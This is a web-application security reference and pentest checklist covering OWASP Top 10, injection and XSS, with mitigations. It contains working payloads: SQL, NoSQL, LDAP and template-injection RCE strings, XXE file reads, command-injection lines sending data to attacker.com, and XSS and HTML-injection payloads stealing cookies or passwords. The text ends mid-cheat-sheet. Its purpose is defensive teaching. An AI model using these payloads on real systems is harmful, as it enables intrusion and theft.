# 🔐 Web Security Vulnerability Checker — Complete Reference

> **What this document is:** A self-contained, agent-style vulnerability reference and structured checklist for auditing web applications. It covers every major vulnerability class from trivial misconfigurations to sophisticated server-side attacks — with detection methods, exploitation techniques, payload examples, and concrete mitigations. Use it as a manual reference, a penetration testing guide, or the knowledge base for an automated security scanning agent.

---

## Table of Contents

1. [Severity Legend & How to Use This Agent](#severity-legend)
2. [OWASP Top 10 — Core Foundation](#owasp-top-10)
3. [Injection Vulnerabilities — Deep Dive](#injection-deep-dive)
4. [Cross-Site Scripting (XSS) — Full Spectrum](#xss-full-spectrum)
5. [Authentication & Session Vulnerabilities](#auth-session)
6. [Access Control & Authorization Vulnerabilities](#access-control)
7. [CSRF & Clickjacking](#csrf-clickjacking)
8. [Server-Side Vulnerabilities](#server-side)
9. [Infrastructure & Configuration Vulnerabilities](#infrastructure)
10. [Advanced & Emerging Vulnerabilities](#advanced-emerging)
11. [The Vulnerability Checking Agent — Structured Checklist](#agent-checklist)
12. [Tools Reference Table](#tools-reference)
13. [Quick Reference Payload Cheat Sheets](#payload-cheatsheets)
14. [Remediation Priority Matrix](#remediation-matrix)
15. [Explore Further](#explore-further)

---

## 1. Severity Legend & How to Use This Agent {#severity-legend}

### Severity Rating System

| Severity | Label | Indicator | Description |
|---|---|---|---|
| Critical | CRITICAL | 🔴 | Immediate exploitation risk; full system/data compromise possible without authentication |
| High | HIGH | 🟠 | Significant data or system risk; exploitable by an attacker with basic access |
| Medium | MEDIUM | 🟡 | Exploitable under specific conditions; requires user interaction or chained with other issues |
| Low | LOW | 🟢 | Minor risk; limited impact, often informational in isolation |
| Informational | INFO | 🔵 | Best practice / hardening recommendation; not directly exploitable |

### How to Use This Agent

This document follows a **scan → identify → test → document → remediate** workflow:

1. **Scan** — Use the Phase 1 reconnaissance checklist (Section 11) to map the attack surface: subdomains, tech stack, exposed files, and entry points.
2. **Identify** — Match discovered endpoints, parameters, and behaviors against the vulnerability classes in Sections 2–10.
3. **Test** — Apply the detection checklists and payload examples for each candidate vulnerability. Use the tools listed in Section 12.
4. **Document** — Record every finding using the reporting template in Section 11, Phase 7.
5. **Remediate** — Apply the concrete mitigations in each section, then re-test. Use the Remediation Priority Matrix (Section 14) to sequence fixes.

**Scope note:** All payloads and techniques in this document are for authorized security testing only. Unauthorized testing is illegal.

[↑ Back to Top](#table-of-contents)

---

## 2. OWASP Top 10 — Core Foundation {#owasp-top-10}

The OWASP Top 10 (2021 edition) represents the most critical web application security risks, ranked by prevalence and exploitability across the industry.

---

### [A01] Broken Access Control — 🔴 CRITICAL

**What it is:** The application fails to enforce restrictions on what authenticated users are allowed to do, letting attackers access data or functions belonging to other users or administrators.

**How it works:** Access control decisions happen server-side. When the server trusts client-supplied identifiers (user IDs in URLs, hidden form fields, JWT claims) without verifying the requesting user owns that resource, any user can substitute another user's identifier and retrieve their data.

**Detection checklist:**
- [ ] Can you access `/admin` or `/api/admin` without admin privileges?
- [ ] Can you change a numeric ID in a URL (`/user/1234`) to another user's ID and see their data?
- [ ] Can you access another user's resources by replaying their session token?
- [ ] Are HTTP methods (PUT, DELETE) restricted to authorized roles?
- [ ] Does the app expose directory listings?

**Testing techniques:**
- Manual: Change `id`, `user_id`, `account` parameters in requests to other users' values
- Automated: Burp Suite's Autorize extension — tests every request as a lower-privilege user automatically
- Forced browsing: enumerate `/admin`, `/backup`, `/config`, `/internal` paths

**Example payload / PoC:**
```http
GET /api/v1/invoices/10042 HTTP/1.1
Host: target.com
Authorization: Bearer <token_of_user_A>
```
Change `10042` to `10043` (belonging to user B). If you receive user B's invoice, IDOR is confirmed.

**Mitigation:**
- Enforce access control server-side on every request — never trust client-supplied role or ownership claims
- Deny by default: all access is forbidden unless explicitly granted
- Use indirect object references (random UUIDs instead of sequential integers)
- Log and alert on access control failures
- Implement automated integration tests that verify lower-privilege users cannot access higher-privilege resources

**Tools:** Burp Suite + Autorize extension, OWASP ZAP, ffuf (for forced browsing)

---

### [A02] Cryptographic Failures — 🔴 CRITICAL

**What it is:** Sensitive data (passwords, credit cards, health records, session tokens) is exposed because it is transmitted or stored without adequate encryption, or with broken/weak cryptographic algorithms.

**How it works:** Three concrete failure modes: (1) data transmitted over HTTP instead of HTTPS is readable by any network observer; (2) passwords stored as MD5/SHA1 hashes (without salt) are crackable against rainbow tables in seconds; (3) weak keys or deprecated algorithms (DES, RC4, TLS 1.0) allow decryption.

**Detection checklist:**
- [ ] Is any page served over HTTP (not HTTPS)?
- [ ] Are passwords stored as MD5, SHA1, or unsalted hashes?
- [ ] Does the app use TLS 1.0 or 1.1?
- [ ] Are sensitive cookies missing the `Secure` flag?
- [ ] Is sensitive data (SSN, credit cards) stored in plaintext in the database?
- [ ] Are encryption keys hardcoded in source code?
- [ ] Does the app use ECB mode for block ciphers?

**Testing techniques:**
- SSL Labs scan: `https://www.ssllabs.com/ssltest/`
- Check response headers for `Strict-Transport-Security`
- Inspect cookies for `Secure` and `HttpOnly` flags
- Review source code for hardcoded keys (`grep -r "password\|secret\|key" --include="*.js"`)

**Example PoC:**
```bash
# Test TLS version support
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for weak cipher suites
testssl.sh target.com
```

**Mitigation:**
- Enforce HTTPS everywhere; redirect all HTTP to HTTPS; set HSTS with `max-age=31536000; includeSubDomains; preload`
- Store passwords with bcrypt, Argon2, or scrypt (never MD5/SHA1)
- Use AES-256-GCM for symmetric encryption; RSA-2048+ or ECDSA P-256+ for asymmetric
- Disable TLS 1.0 and 1.1; disable RC4, DES, 3DES cipher suites
- Mark all sensitive cookies as `Secure; HttpOnly; SameSite=Strict`

**Tools:** testssl.sh, SSL Labs, Burp Suite, truffleHog (secret scanning)

---

### [A03] Injection — 🔴 CRITICAL

**What it is:** Untrusted data is sent to an interpreter (SQL engine, OS shell, LDAP server) as part of a command or query, causing the interpreter to execute unintended instructions.

**How it works:** The application builds a query or command by concatenating user input directly into a string. The interpreter cannot distinguish between the intended command structure and the injected data. SQL injection is the canonical example; the same class applies to OS commands, LDAP, XPath, NoSQL, and template engines.

**Detection checklist:**
- [ ] Do any input fields cause database errors when you insert `'` or `"`?
- [ ] Do search fields, login forms, or URL parameters reflect data back from a database?
- [ ] Does the app call OS commands with user-supplied filenames or parameters?
- [ ] Are XML inputs processed with external entity expansion enabled?

**Testing techniques:**
- Insert `'` into every input field; observe error messages
- Time-based blind: `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `'; SELECT SLEEP(5)--` (MySQL)
- Automated: sqlmap, commix

**Example payload:**
```sql
-- Classic authentication bypass
' OR '1'='1
' OR 1=1--
admin'--

-- UNION-based data extraction
' UNION SELECT username,password,NULL FROM users--

-- Time-based blind (MySQL)
' AND SLEEP(5)--
```

**Mitigation:**
- Use parameterized queries / prepared statements — the single most effective control
- Use ORMs with parameterized bindings; never concatenate user input into queries
- Validate input against strict allowlists (type, length, format)
- Apply least-privilege database accounts (no `DROP TABLE` for app accounts)
- Use WAF as defense-in-depth, not as a primary control

**Tools:** sqlmap, commix, Burp Suite, OWASP ZAP

---

### [A04] Insecure Design — 🟠 HIGH

**What it is:** Security flaws baked into the architecture or design of the application before a single line of code is written — missing threat models, no rate limiting by design, business logic that assumes users are honest.

**How it works:** Unlike implementation bugs (which can be patched), insecure design requires re-architecting. Examples: a password reset flow that uses a 4-digit PIN (brute-forceable in 10,000 requests); a multi-step checkout that doesn't validate price server-side at payment time; an API that returns full objects when only one field is needed.

**Detection checklist:**
- [ ] Is there a documented threat model for the application?
- [ ] Are rate limits enforced on authentication endpoints, password reset, and OTP?
- [ ] Is business logic validated server-side at every step (not just client-side)?
- [ ] Does the application expose more data than the UI displays (over-fetching)?
- [ ] Can workflow steps be skipped or reordered?

**Testing techniques:**
- Attempt to skip checkout steps by jumping directly to `/order/confirm`
- Send negative quantities or prices in purchase requests
- Replay old password reset tokens after use
- Brute-force OTP/PIN endpoints to test rate limiting

**Mitigation:**
- Conduct threat modeling (STRIDE) during design; document trust boundaries
- Enforce rate limiting and account lockout at the infrastructure layer (not just application code)
- Validate all business logic server-side at the point of consequence (payment processing, not just cart addition)
- Use secure design patterns: principle of least privilege, defense in depth, fail-safe defaults

**Tools:** OWASP Threat Dragon (threat modeling), Burp Suite (workflow testing)

---

### [A05] Security Misconfiguration — 🟠 HIGH

**What it is:** The application, framework, server, database, or cloud infrastructure is configured insecurely — default credentials left in place, unnecessary features enabled, verbose error messages exposing stack traces, open buckets.

**How it works:** Default configurations prioritize ease of use over security. Developers who don't harden deployments leave attack surface open: a default Tomcat manager at `/manager/html` with credentials `tomcat/tomcat`; a MongoDB instance with no authentication; an AWS bucket set to public-read.

**Detection checklist:**
- [ ] Are default credentials in use (admin/admin, tomcat/tomcat)?
- [ ] Are admin interfaces (`/phpmyadmin`, `/manager`, `/_admin`) exposed to the internet?
- [ ] Do error pages reveal stack traces, framework versions, or database schema?
- [ ] Is directory listing enabled on the web server?
- [ ] Are unused HTTP methods (TRACE, PUT) enabled?
- [ ] Are cloud storage buckets publicly accessible?

**Testing techniques:**
```bash
# Check for TRACE method (XST attack vector)
curl -X TRACE https://target.com/

# Enumerate common admin paths
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Check bucket permissions
aws s3 ls s3://target-bucket --no-sign-request
```

**Mitigation:**
- Automate hardening: use CIS Benchmarks for your OS/framework/cloud platform
- Remove or disable all unused features, ports, services, and accounts
- Configure error handling to return generic messages; log details server-side only
- Implement a repeatable hardening process as part of CI/CD
- Run configuration scanners (Lynis, ScoutSuite for cloud) on every deployment

**Tools:** Nikto, Lynis, ScoutSuite, Prowler, ffuf

---

### [A06] Vulnerable and Outdated Components — 🟠 HIGH

**What it is:** The application uses libraries, frameworks, or other software components with known vulnerabilities that have available patches.

**How it works:** A CVE is published for a library version the application uses. The attacker scans for the version header or known behavior, then applies the public exploit. Log4Shell (CVE-2021-44228) is the canonical example: a single JNDI lookup string in any logged input caused RCE in applications using Log4j 2.x before 2.15.0.

**Detection checklist:**
- [ ] Are all dependency versions pinned and inventoried (SBOM)?
- [ ] Does the CI pipeline run dependency vulnerability scanning?
- [ ] Are OS-level packages patched?
- [ ] Are JavaScript frontend libraries (jQuery, Bootstrap) up to date?
- [ ] Are Docker base images scanned for CVEs?

**Testing techniques:**
```bash
# Node.js
npm audit

# Python
pip-audit

# Java (using OWASP Dependency-Check)
dependency-check --project "MyApp" --scan./

# Container scanning
trivy image myapp:latest
```

**Mitigation:**
- Maintain a Software Bill of Materials (SBOM); use tools like Syft or CycloneDX
- Integrate Dependabot, Renovate, or Snyk into CI/CD for automated PR updates
- Subscribe to security advisories for every major dependency
- Remove unused dependencies; minimize the dependency tree

**Tools:** OWASP Dependency-Check, Snyk, Trivy, npm audit, pip-audit, Dependabot

---

### [A07] Identification and Authentication Failures — 🟠 HIGH

**What it is:** Weaknesses in how the application confirms user identity — no account lockout, weak passwords accepted, session tokens that don't expire, credentials exposed in URLs.

**How it works:** Credential stuffing: an attacker takes a breach database of 100M email/password pairs and replays them against the login endpoint. If there's no rate limiting, lockout, or MFA, a fraction of those credentials will succeed. Session fixation: the server issues the same session token before and after login, so an attacker who obtained the pre-login token can hijack the post-login session.

**Detection checklist:**
- [ ] Does the login endpoint rate-limit or lock out after repeated failures?
- [ ] Are session tokens regenerated after successful login?
- [ ] Do session tokens expire after inactivity?
- [ ] Are credentials ever passed in URL query strings (visible in logs)?
- [ ] Does the app permit weak passwords (< 8 characters, common passwords)?
- [ ] Is MFA available and enforced for privileged accounts?

**Example PoC — Session Fixation:**
```http
# Attacker sets a known session ID before victim logs in
GET /login HTTP/1.1
Cookie: PHPSESSID=attacker_controlled_value

# If server doesn't regenerate session ID after login, attacker now has valid session
```

**Mitigation:**
- Regenerate session ID immediately after login (and after privilege escalation)
- Implement account lockout or exponential backoff after 5–10 failed attempts
- Enforce minimum password length of 12+ characters; check against breach databases (HaveIBeenPwned API)
- Set session timeout: absolute (e.g., 8 hours) and idle (e.g., 30 minutes)
- Require MFA for all admin accounts; offer it for all users

**Tools:** Hydra, Burp Suite Intruder, ffuf (credential stuffing simulation in authorized tests)

---

### [A08] Software and Data Integrity Failures — 🟠 HIGH

**What it is:** Code or data from untrusted sources is used without integrity verification — insecure CI/CD pipelines, auto-update mechanisms that don't verify signatures, deserialization of untrusted data.

**How it works:** An attacker compromises an npm package that 10,000 applications depend on (supply chain attack). Or: the application deserializes a user-supplied Java object without validation — the attacker crafts a malicious object using a known gadget chain (ysoserial) that executes OS commands upon deserialization.

**Detection checklist:**
- [ ] Are third-party scripts loaded from CDNs without Subresource Integrity (SRI) hashes?
- [ ] Does the CI/CD pipeline verify code signatures before deployment?
- [ ] Does the application deserialize user-supplied data (Java ObjectInputStream, PHP unserialize, Python pickle)?
- [ ] Are software update packages verified with cryptographic signatures?

**Example — SRI missing:**
```html
<!-- VULNERABLE: no integrity check -->
<script src="https://cdn.example.com/jquery.min.js"></script>

<!-- SAFE: SRI hash prevents tampered script execution -->
<script src="https://cdn.example.com/jquery.min.js"
 integrity="sha384-[hash]"
 crossorigin="anonymous"></script>
```

**Mitigation:**
- Add SRI hashes to all externally loaded scripts and stylesheets
- Use signed commits and verify signatures in CI/CD pipelines
- Never deserialize data from untrusted sources; if unavoidable, use allowlist-based deserialization
- Pin dependency versions and verify checksums (lock files: `package-lock.json`, `Pipfile.lock`)
- Implement SLSA (Supply-chain Levels for Software Artifacts) framework for build integrity

**Tools:** retire.js, Snyk, ysoserial (for testing Java deserialization in authorized tests), SRI Hash Generator

---

### [A09] Security Logging and Monitoring Failures — 🟡 MEDIUM

**What it is:** The application does not log security-relevant events (failed logins, access control failures, input validation failures), or logs are not monitored, allowing attackers to operate undetected.

**How it works:** Without logs, a successful breach is only discovered when the attacker causes visible damage. Without monitoring, even detailed logs provide no value. The median time to detect a breach without proper logging/monitoring is measured in months.

**Detection checklist:**
- [ ] Are failed login attempts logged with IP, timestamp, and username?
- [ ] Are access control failures (403 responses) logged?
- [ ] Are logs stored in a tamper-evident, centralized system (SIEM)?
- [ ] Are alerts configured for brute-force patterns (10+ failures from one IP)?
- [ ] Do logs contain enough context to reconstruct an attack timeline?
- [ ] Are logs protected from deletion by the compromised application account?

**Mitigation:**
- Log all authentication events (success and failure), privilege changes, and input validation failures
- Include: timestamp, user ID, IP address, action, outcome — never log passwords or tokens
- Ship logs to a centralized SIEM (Splunk, ELK, Datadog) with write-once storage
- Configure alerts for: brute force (>10 failures/minute), impossible travel, admin actions outside business hours
- Test detection: run a simulated attack and verify alerts fire within 15 minutes

**Tools:** ELK Stack, Splunk, Graylog, OSSEC, Wazuh

---

### [A10] Server-Side Request Forgery (SSRF) — 🔴 CRITICAL

**What it is:** The server fetches a remote resource at a URL supplied by the user, and the attacker supplies an internal URL — causing the server to make requests to internal services the attacker cannot reach directly.

**How it works:** The application has a feature like "fetch a preview of this URL" or "import data from this endpoint." The attacker supplies `http://169.254.169.254/latest/meta-data/` (AWS instance metadata). The server fetches it from inside the cloud VPC and returns the response — exposing IAM credentials, instance metadata, and internal network topology.

**Detection checklist:**
- [ ] Does the app accept user-supplied URLs and fetch them server-side?
- [ ] Are webhook URLs, avatar URLs, or PDF/screenshot URLs user-controlled?
- [ ] Does the app make outbound HTTP requests based on user input?
- [ ] Are responses from fetched URLs returned to the user?

**Example payload:**
```
# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal service discovery
http://localhost:8080/admin
http://10.0.0.1/

# DNS rebinding bypass
http://attacker.com/ (resolves to 169.254.169.254 on second lookup)
```

**Mitigation:**
- Allowlist permitted URL schemes (https only) and destination domains; deny all others
- Block requests to RFC-1918 ranges (10.x, 172.16-31.x, 192.168.x), loopback (127.x), and link-local (169.254.x)
- Disable redirects in the HTTP client used for server-side fetches
- Use a dedicated egress proxy that enforces the allowlist at the network layer
- In cloud environments, block access to the metadata endpoint at the network level (IMDSv2 enforcement on AWS)

**Tools:** SSRFmap, Burp Collaborator, interactsh

[↑ Back to Top](#table-of-contents)

---

## 3. Injection Vulnerabilities — Deep Dive {#injection-deep-dive}

---

### SQL Injection — 🔴 CRITICAL

**Mechanism:** User input is concatenated into a SQL query string. The database engine parses the combined string as a single query, executing the injected portion.

**Sub-types and payloads:**

**Classic / Error-based:**
```sql
-- Trigger error to reveal DB version (MySQL)
' AND extractvalue(1, concat(0x7e, version))--

-- MSSQL error-based
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
```

**UNION-based (column count enumeration first):**
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- -- error here means 2 columns

-- Extract data
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, table_name FROM information_schema.tables--
```

**Boolean-based blind:**
```sql
-- True condition (normal response)
' AND 1=1--

-- False condition (empty/different response)
' AND 1=2--

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1--
```

**Time-based blind:**
```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=1 AND (SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--
```

**Out-of-band (DNS exfiltration):**
```sql
-- MSSQL (requires outbound DNS)
'; EXEC master..xp_dirtree '//attacker.com/x'--
```

**Detection checklist:**
- [ ] Insert `'`, `"`, `;`, `--` into every parameter; observe errors
- [ ] Compare responses for `AND 1=1` vs `AND 1=2`
- [ ] Test time-based blind with `SLEEP(5)` payloads
- [ ] Use sqlmap with `--level=5 --risk=3` for thorough testing

**Mitigation:** Parameterized queries (prepared statements) in every query. If dynamic SQL is unavoidable, use stored procedures with parameterized inputs.

**Tools:** sqlmap (`sqlmap -u "https://target.com/page?id=1" --dbs`), Burp Suite, Havij (legacy)

---

### NoSQL Injection — 🟠 HIGH

**Mechanism:** MongoDB and other NoSQL databases accept query operators in JSON. If user input is merged into a query object without sanitization, operators like `$gt`, `$where`, and `$regex` can manipulate query logic.

**Example payloads (MongoDB):**
```javascript
// Login bypass — POST body
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// $where JavaScript injection
{"$where": "this.username == 'admin' && sleep(5000)"}

// Array injection in URL parameter
?username[$ne]=invalid&password[$ne]=invalid
```

**Detection checklist:**
- [ ] Does the login form accept JSON body? Try operator injection
- [ ] Do URL parameters accept bracket notation (`param[$ne]=x`)?
- [ ] Does inserting `{"$gt": ""}` cause different behavior than a normal value?

**Mitigation:** Validate that user input is a scalar value (string/number) before using it in a query object. Use schema validation libraries (Joi, Yup). Never pass raw user objects to MongoDB query methods.

**Tools:** NoSQLMap, Burp Suite

---

### OS Command Injection — 🔴 CRITICAL

**Mechanism:** The application passes user input to a system shell command. The attacker appends shell operators to break out of the intended command and execute arbitrary OS commands.

**Payloads:**
```bash
# Command chaining operators
; whoami
| whoami
&& whoami
|| whoami
`whoami`
$(whoami)

# Blind command injection (time-based)
; ping -c 5 127.0.0.1
; sleep 5

# Blind OOB (DNS exfiltration)
; nslookup `whoami`.attacker.com
; curl http://attacker.com/$(whoami)

# Filter bypass
w'h'o'a'm'i
who$ami
```

**Detection checklist:**
- [ ] Does the app call system utilities with user-supplied parameters (filename, IP, hostname)?
- [ ] Do ping, traceroute, DNS lookup, image conversion, or PDF generation features accept user input?
- [ ] Does inserting `;sleep 5` cause a 5-second response delay?

**Mitigation:** Never pass user input to shell commands. Use language-native libraries instead of shell calls (e.g., use Python's `subprocess` with a list argument, never `shell=True`). If shell calls are unavoidable, use strict allowlists for permitted characters.

**Tools:** commix (`commix --url="https://target.com/ping?host=INJECT_HERE"`)

---

### LDAP Injection — 🟠 HIGH

**Mechanism:** User input is inserted into an LDAP filter string. Injecting LDAP metacharacters (`*`, `(`, `)`, `\`, `NUL`) manipulates the filter logic.

**Payloads:**
```
# Authentication bypass (username field)
*)(uid=*))(|(uid=*

# Dump all users
*))(|(cn=*

# Null byte termination
admin\00
```

**Detection:** Insert `*` into username fields; if all users are returned or login succeeds, LDAP injection is present.

**Mitigation:** Escape all user input using LDAP-specific escaping functions (`ldap_escape` in PHP, similar in other languages). Validate input against allowlists before including in LDAP filters.

---

### XPath Injection — 🟡 MEDIUM

**Mechanism:** User input is injected into an XPath query used to navigate XML data. Similar to SQL injection but targeting XML datastores.

**Payloads:**
```xpath
' or '1'='1
' or 1=1 or 'a'='a
x' or name='username' or 'x'='y
```

**Detection:** Insert `'` into login fields backed by XML; look for XPath parsing errors.

**Mitigation:** Use parameterized XPath queries (XPath variables); never concatenate user input into XPath strings.

---

### Server-Side Template Injection (SSTI) — 🔴 CRITICAL

**Mechanism:** User input is rendered inside a server-side template. When the template engine evaluates the input, injected template syntax executes arbitrary code.

**Detection payload (universal):**
```
{{7*7}} → if output is 49, template injection confirmed
${7*7} → Freemarker, Velocity
<%= 7*7 %> → ERB (Ruby)
#{7*7} → Ruby string interpolation
*{7*7} → Spring SpEL
```

**Engine-specific RCE payloads:**
```python
# Jinja2 (Python) — RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read}}
{{''.__class__.__mro__[1].__subclasses__[396]('id',shell=True,stdout=-1).communicate[0].strip}}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new>${ex("id")}
```

**Detection checklist:**
- [ ] Does any parameter render in a page template?
- [ ] Does `{{7*7}}` return `49` in the response?
- [ ] Does `${7*7}` or `<%= 7*7 %>` return `49`?

**Mitigation:** Never pass user input directly to template rendering functions. Use sandboxed template engines; if user-controlled content must be rendered, use a logic-less template engine (Mustache) or sanitize with an allowlist.

**Tools:** tplmap (`tplmap -u "https://target.com/page?name=INJECT"`), Burp Suite

---

### XML External Entity (XXE) Injection — 🔴 CRITICAL

**Mechanism:** The XML parser processes DOCTYPE declarations that define external entities. If external entity processing is enabled, the attacker can read local files, perform SSRF, or exfiltrate data out-of-band.

**Basic file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**SSRF via XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>
```

**Blind XXE (OOB via DNS):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
 %xxe;
]>
<foo>&send;</foo>
```

```xml
<!-- evil.dtd on attacker server -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://attacker.com/?data=%data;'>">
%param1;
```

**Detection checklist:**
- [ ] Does the application accept XML input (SOAP, REST with XML body, file upload)?
- [ ] Does inserting a DOCTYPE declaration cause a different response?
- [ ] Does the parser return file contents when an external entity references a local file?

**Mitigation:** Disable external entity processing in the XML parser — this is a one-line configuration change in most parsers:
```java
// Java (DocumentBuilderFactory)
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
Use JSON instead of XML where possible. Apply input validation to reject DOCTYPE declarations.

**Tools:** Burp Suite (XXE scanner), XXEinjector

---

### HTML Injection — 🟡 MEDIUM

**Mechanism:** User-supplied HTML tags are rendered in the browser without encoding. Unlike XSS, the attacker injects HTML elements (forms, links) rather than JavaScript — enabling phishing, form hijacking, and UI redressing.

**Payloads:**
```html
<h1>Your account has been suspended. <a href="http://attacker.com/login">Click here to verify</a></h1>

<form action="http://attacker.com/steal" method="POST">
 <input type="text" name="username" placeholder="Enter username">
 <input type="password" name="password" placeholder="Enter password">
 <input type="submit" value="Login">
</form>
```

**Mitigation:** HTML-encode all user-supplied output. Use a Content Security Policy that blocks external form action targets.

---

### CRLF Injection — 🟡 MEDIUM

**Mechanism:** Carriage Return (`\r`, `%0d`) and Line Feed (`\n`, `%0a`) characters injected into HTTP response headers allow the attacker to split the response and inject arbitrary headers or a response body.

**Payloads:**
```
# Header injection via URL parameter
https://target.com/redirect?url=http://attacker.com%0d%0aSet-Cookie:%20session=attacker

# Log injection
username=admin%0a[2024-01-01] User admin logged in successfully
```

**Impact:** Session fixation via injected `Set-Cookie`, XSS via injected `Content-Type: text/html`, cache poisoning.

**Mitigation:** Strip or reject `\r` and `\n` characters from any user input used in HTTP headers. Use framework-level header-setting functions that handle encoding automatically.

[↑ Back to Top](#table-of-contents)

---

## 4. Cross-Site Scripting (XSS) — Full Spectrum {#xss-full-spectrum}

XSS is the most prevalent client-side vulnerability. It occurs when an application includes user-supplied data in a page without proper encoding, allowing script execution in the victim's browser.

---

### Reflected XSS — 🟠 HIGH

**Mechanism:** The injected script is included in the server's response to the current request — it "reflects" back immediately. The attacker delivers the payload via a crafted URL; the victim must click the link.

**Detection:**
```
https://target.com/search?q=<script>alert(1)</script>
https://target.com/error?msg=<img src=x onerror=alert(1)>
```

**Bypass techniques:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Attribute injection when inside a tag -->
" onmouseover="alert(1)

<!-- No parentheses (filter bypass) -->
<img src=x onerror=alert`1`>
```

---

### Stored/Persistent XSS — 🔴 CRITICAL

**Mechanism:** The payload is stored in the database and served to every user who views the affected page. Impact is amplified: one injection affects all viewers, including administrators.

**High-impact targets:** Comment fields, user profile names, product reviews, support ticket fields, admin-visible log entries.

**Payload escalation — admin cookie theft:**
```javascript
<script>
fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

// Or via image tag (no script tag required)
<img src=x onerror="this.src='https://attacker.com/steal?c='+document.cookie">
```

---

### DOM-Based XSS — 🟠 HIGH

**Mechanism:** The vulnerability exists entirely in client-side JavaScript. User-controlled data (from `location.hash`, `location.search`, `document.referrer`) flows into a dangerous sink (`innerHTML`, `eval`, `document.write`) without sanitization.

**Common sources (attacker-controlled inputs):**
- `document.location` / `location.href` / `location.hash`
- `document.referrer`
- `window.name`
- `postMessage` data

**Common sinks (dangerous execution points):**
- `innerHTML`, `outerHTML`
- `eval`, `setTimeout(string)`, `setInterval(string)`
- `document.write`, `document.writeln`
- `jQuery.html`, `.append` with untrusted data

**Example vulnerable code:**
```javascript
// Vulnerable: location.hash flows into innerHTML
document.getElementById('output').innerHTML = location.hash.substring(1);

// Exploit URL
https://target.com/page#<img src=x onerror=alert(1)>
```

**Detection:** Use browser DevTools to trace data flow from sources to sinks. DOM Invader (Burp Suite) automates this.

---

### Blind XSS — 🟠 HIGH

**Mechanism:** The payload fires in a different context than where it was injected — typically in an admin panel, log viewer, or support ticket system that the tester cannot directly observe.

**Technique:** Inject a payload that phones home when executed:
```javascript
// XSS Hunter / interactsh payload
<script src="https://your-xss-hunter-instance.com/payload.js"></script>

// Self-contained beacon
<script>
var i=new Image;
i.src='https://attacker.com/blind?url='+encodeURIComponent(document.location)
+'&cookie='+encodeURIComponent(document.cookie)
+'&dom='+encodeURIComponent(document.body.innerHTML.substring(0,500));
</script>
```

**Target injection points:** Feedback forms, support tickets, user agent strings, referrer headers, log viewers, admin search fields.

---

### Mutation XSS (mXSS) — 🟠 HIGH

**Mechanism:** The browser's HTML parser mutates (transforms) sanitized HTML into a form that contains executable script. A sanitizer sees safe HTML; the browser DOM parser produces a different, executable version.

**Example:** Some sanitizers pass `<listing>` or SVG `<use>` elements that browsers parse differently, re-introducing script execution.

**Mitigation:** Use DOMPurify with `FORCE_BODY` option and keep it updated — mXSS bypasses are discovered regularly and patched in DOMPurify releases.

---

### CSP Bypass Techniques — 🟡 MEDIUM

**Mechanism:** Content Security Policy restricts which scripts execute. Common misconfigurations allow bypass:

**JSONP abuse (when `script-src` allows a JSONP endpoint domain):**
```html
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
```

**`unsafe-inline` present:** CSP is bypassed entirely for inline scripts.

**`unsafe-eval` present:** `eval`, `setTimeout(string)`, `new Function` all work.

**Nonce bypass via DOM clobbering or base tag injection:**
```html
<!-- If base tag injection is possible -->
<base href="https://attacker.com/">
<!-- Relative script src now loads from attacker -->
```

**Angular sandbox escape (legacy):**
```javascript
{{constructor.constructor('alert(1)')}}
```

---

### XSS Payload Cheat Sheet

<details>
<summary>Click to expand — 20+ XSS payloads for various contexts</summary>

```javascript
// Basic
<script>alert(1)</script>
<script>alert(document.domain)</script>

// Image tag
<img src=x onerror=alert(1)>
<img src="javascript:alert(1)">

// SVG
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

// Event handlers
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

// No parentheses
<img src=x onerror=alert`1`>
<svg/onload=alert`1`>

// HTML entity encoding bypass
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

// Double URL encoding
%253Cscript%253Ealert(1)%253C/script%253E

// JavaScript URI
<a href="javascript:alert(1)">click</a>

// CSS injection (legacy IE)
<div style="background:url('javascript:alert(1)')">

// Template literal
<script>alert`1`</script>

// Polyglot (works in multiple contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert//>\x3e

// iframe srcdoc
<iframe srcdoc="<script>alert(1)<\/script>">

// Data URI
<object data="data:text/html,<script>alert(1)</script>">

// Stored XSS cookie theft
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// Keylogger
